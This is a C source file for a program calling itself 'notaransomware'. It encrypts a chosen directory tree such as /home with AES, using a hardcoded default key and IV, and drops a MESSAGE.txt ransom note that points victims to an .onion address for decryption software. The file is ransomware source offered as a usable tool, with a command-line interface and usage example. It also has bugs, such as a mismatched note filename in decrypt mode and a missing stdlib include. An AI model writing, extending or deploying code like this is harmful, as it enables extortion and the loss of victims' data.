//
// Created by NoFu1 on 4/20/22.
//

#include <stdio.h>
#include <string.h>
#include "crypt.h"




void printUsage();

int main( int argc, char *argv[] ) {

        const char *arg_mode = "-m";
        const char *arg_initvector = "-i";
        const char *arg_key = "-k";

        const char *message = "Reach out to whatever.onion to get the decryption software.\n";

        const int initvectorLenght = 16;
        const int keyLenght = 32;

        if ( argc < 2) {
                printUsage();
                return 0;
        }
        //Set default options
        unsigned char key[] = "12345678901234561234567890123456";// 32 char 256bit key
        unsigned char initvector[] = "1234567890123456";//same size as block 16 char 128 bit block
        char mode = 'e';

        // Get all args (order doesn't matter)
        for (int i = 1; i < argc; i++) {
                if (!strcmp(arg_mode, argv[i])){
                        if (!strcmp(argv[++i], "encrypt")) {
                                mode = 'e';
                        } else if (!strcmp(argv[i], "decrypt")) {
                                mode = 'd';
                        } else {
                                printUsage();
                        }
                }
                if (!strcmp(arg_initvector, argv[i])){
                        if (strlen(argv[++i]) == initvectorLenght){
                                strcpy(initvector, argv[i]);
                        } else {
                                printUsage();
                        }
                }
                if (!strcmp(arg_key, argv[i])){
                        if (strlen(argv[++i]) == keyLenght){
                                strcpy(key, argv[i]);
                        } else {
                                printUsage();
                        }
                }
        }

        if (lsRcrypt(argv[argc-1], mode, key, initvector)){
                printUsage();
        } else if (mode == 'e') {
                char *filename = "/MESSAGE.txt";
                char *fullpath = (char *) malloc(strlen(argv[argc - 1]) + strlen(filename) + 2);
                strcpy(fullpath, argv[argc - 1]);
                strcat(fullpath, filename);
                FILE *messageOutput = fopen(fullpath, "w");
                fprintf(messageOutput, "%s", message);
                fclose(messageOutput);
        } else if (mode == 'd') {
                char *filename = "/ME"; // File name of message after encryption
                char *fullpath = (char *) malloc(strlen(argv[argc - 1]) + strlen(filename) + 2);
                strcpy(fullpath, argv[argc - 1]);
                strcat(fullpath, filename);
                remove(fullpath); //delete message file
        }
        return 1;
}


void printUsage(){
        printf("Usage:\n");
        printf("\t./notaransomware [options] [starting folder]\n\n");
        printf("Options:\n");
        printf("\t-m\t\tSpecifies mode \e[1mencrypt \e[0mor \e[1mdecrypt\e[0m -> default: \e[1mencrypt\e[0m\n");
        printf("\t-k\t\tSet 256bit (32 char) encryption key -> default \e[1m12345678901234561234567890123456\e[0m\n");
        printf("\t-i\t\tSet 128bit (16 char) initialisation vector -> default \e[1m1234567890123456\e[0m\n\n");
        printf("Example:\n");
        printf("\t./notaransomware -m encrypt -k 12345678901234561234567890123456 /home");
}
